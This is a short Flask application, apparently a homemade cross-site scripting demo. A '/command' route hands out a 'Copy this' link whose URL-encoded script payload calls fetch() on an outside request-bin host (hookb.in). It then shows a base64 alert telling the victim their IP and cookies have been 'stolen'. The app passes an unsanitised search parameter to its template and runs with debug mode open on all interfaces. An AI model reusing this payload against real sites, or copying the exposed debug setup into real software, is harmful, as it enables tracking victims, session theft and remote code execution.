from flask import Flask, render_template, request, make_response
import db

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        db.add_comment(request.form['comment'])

    search_query = request.args.get('q')

    comments = db.get_comments(search_query)
    response = make_response(render_template('index.html',
                           comments=comments,
                           search_query=search_query))
    response.set_cookie('name', 'value')
    return response

@app.route("/command")
def command():
    return "Go To this Link (Copy this) : http://192.168.0.7/?q=%3Cscript%3E%0Aconst%20url='https://hookb.in/3ONmXMeElPh7yakkMWZR';%0Afetch(url);%0Aalert(atob(%22SGVsbG8hIFVzZXIhCllvdSBIYXZlIEJlZW4gSG9va2VkIQpZb3VyIElQIGhhcyBiZWVuIFN0b2xlbiEKWW91ciBDb29raWVzLi4uLiBTdG9sZW4hClJlZ2FyZHMsCk9QSE9PSw==%22))%0A%3C/script%3E"

app.run(host='0.0.0.0', port=80, debug=True)
